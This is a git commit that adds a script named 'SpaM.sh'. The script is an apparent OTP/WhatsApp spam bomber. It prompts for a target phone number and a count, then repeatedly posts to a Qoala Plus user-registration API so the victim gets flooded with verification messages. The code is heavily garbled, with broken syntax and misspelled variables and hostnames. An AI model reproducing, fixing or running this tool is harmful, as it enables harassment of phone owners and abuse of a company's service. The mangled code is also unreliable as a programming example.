87efbde9ea4b0a217d0ad517a4d935ceba67bea5
ewepaksa123 <sejatipria990@gmail.com>
2024-05-19 23:08:19 +0700

    Create SpaM.sh

---
+++ SpaM.sh
@@ -0,0 +1,22 @@
+import
+requests.json
+k-0 print("Maksimal Span 4 kali)
+nomer input("Honer Target") Jumlah int(input("Jumlah Span: "))
+for k in range(jumlah):
+k1
+head (
+"Host": "api.qualaplus.com". 
+"content-length": "48".
+"accept": "application/json, text/plain. */*".
+"user-agent":"Mozilla/5.0 (Linux; Android 10: Redni 8) AppleWebKit/537.36 (KHTML. 11"
+"content-type": "application/json".
+"origin": "https://wer.qoalaplus.com".
+"sec-fetch-site": "same-site". "sec-fetch-mode": "cors".
+"sec-fetch-dest": "empty".
+"referer": "https://www.goalaplus.com/". "accept-encoding": "gzip, deflate, br"
+"accept-language": "14-ID.id:q-0.9.en-US:q-0.8.en:q-0.7") data json.dumps(("phone number":"+62"+noner, "channel":"
+pos requests.post("https://api.qoalaplus.com/go-agent/v2/user/register".headers-head
+if "success" in pes:
+print("Span WhatsApp Goala Plus Berhasil".k)
+else:
+    print("Span WhatsApp Goala Plus Sagal Ke".k)
